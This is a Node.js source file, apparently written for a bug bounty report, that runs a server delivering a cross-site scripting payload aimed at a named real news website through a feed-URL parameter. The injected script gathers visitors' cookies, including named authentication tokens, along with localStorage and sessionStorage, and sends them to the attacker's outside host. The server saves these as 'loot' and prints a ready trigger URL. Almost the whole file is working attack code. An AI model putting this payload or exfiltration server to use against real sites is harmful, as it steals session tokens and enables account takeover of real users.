/**
 * XSS payload server - serves JSON with permissive CORS for bug bounty testing.
 * Phase 2: Exfiltration payload for HackerOne escalation (Medium → Critical).
 *
 * Routes:
 *   GET  /         → Serves XSS payload JSON (fetched by _breaking_feed_url)
 *   GET  /exfil    → Receives exfiltrated data via query string (img beacon)
 *   POST /exfil    → Receives exfiltrated data via POST body (fetch)
 *   GET  /loot     → View all captured loot
 *   GET  /alert    → Original alert-only payload (for reference)
 */

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL || `https://xss-cors-payload.onrender.com`;
const LOOT_FILE = path.join(__dirname, 'loot.json');

// Initialize loot storage
let loot = [];
try {
  if (fs.existsSync(LOOT_FILE)) {
    loot = JSON.parse(fs.readFileSync(LOOT_FILE, 'utf8'));
  }
} catch (e) {
  loot = [];
}

function saveLoot(entry) {
  entry.timestamp = new Date().toISOString();
  loot.push(entry);
  try { fs.writeFileSync(LOOT_FILE, JSON.stringify(loot, null, 2)); } catch(e) {}
  console.log('\n========== LOOT CAPTURED ==========');
  console.log(JSON.stringify(entry, null, 2));
  console.log('====================================\n');
}

// ---- XSS Payload ----
// This JS runs in the context of www.foxbusiness.com when the XSS fires.
// It collects document.cookie (includes FOXKITAUTHN with accessToken, refreshToken, idToken),
// all localStorage keys/values, and all sessionStorage keys/values, then exfiltrates via fetch.
const xssScript = `
(function(){
  var e='${BASE_URL}/exfil';
  var d={
    domain:document.domain,
    url:location.href,
    cookie:document.cookie,
    localStorage:{},
    sessionStorage:{}
  };
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d.localStorage[k]=localStorage.getItem(k);}}catch(x){}
  try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);d.sessionStorage[k2]=sessionStorage.getItem(k2);}}catch(x){}
  fetch(e,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d)});
  new Image().src=e+'?c='+encodeURIComponent(document.cookie).slice(0,2000);
})();
`.replace(/\n/g, '').replace(/\s{2,}/g, ' ').trim();

const exfilPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: `BREAKING NEWS <img src=x onerror="${xssScript}">`,
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

// Original alert payload for reference
const alertPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: 'SECURITY TEST <img src=x onerror=alert(document.domain)>',
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  // CORS: allow any origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // ---- /exfil: Receive exfiltrated data ----
  if (pathname === '/exfil') {
    if (req.method === 'GET') {
      // Image beacon — cookie in query string
      const entry = {
        type: 'img-beacon',
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        referer: req.headers['referer'],
        query: parsed.query
      };
      saveLoot(entry);
      // Return 1x1 transparent GIF
      const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
      res.setHeader('Content-Type', 'image/gif');
      res.writeHead(200);
      res.end(gif);
      return;
    }
    if (req.method === 'POST') {
      // Fetch POST — full data in body
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      req.on('end', () => {
        let parsed_body;
        try { parsed_body = JSON.parse(body); } catch(e) { parsed_body = body; }
        const entry = {
          type: 'fetch-post',
          ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          referer: req.headers['referer'],
          data: parsed_body
        };
        saveLoot(entry);
        res.writeHead(200);
        res.end('ok');
      });
      return;
    }
  }

  // ---- /loot: View captured loot ----
  if (pathname === '/loot') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ---- /alert: Original alert-only payload ----
  if (pathname === '/alert') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(alertPayload, null, 2));
    return;
  }

  // ---- / (root): Exfiltration payload ----
  res.setHeader('Content-Type', 'application/json');
  res.writeHead(200);
  res.end(JSON.stringify(exfilPayload, null, 2));
});

server.listen(PORT, () => {
  console.log(`XSS payload server on http://localhost:${PORT}`);
  console.log(`Routes:`);
  console.log(`  GET  /       → Exfiltration XSS payload`);
  console.log(`  GET  /exfil  → Receive exfil (img beacon)`);
  console.log(`  POST /exfil  → Receive exfil (fetch POST)`);
  console.log(`  GET  /loot   → View all captured loot`);
  console.log(`  GET  /alert  → Original alert payload`);
  console.log(`\nTrigger URL:`);
  console.log(`  https://www.foxbusiness.com/?_breaking_feed_url=${BASE_URL}/`);
});
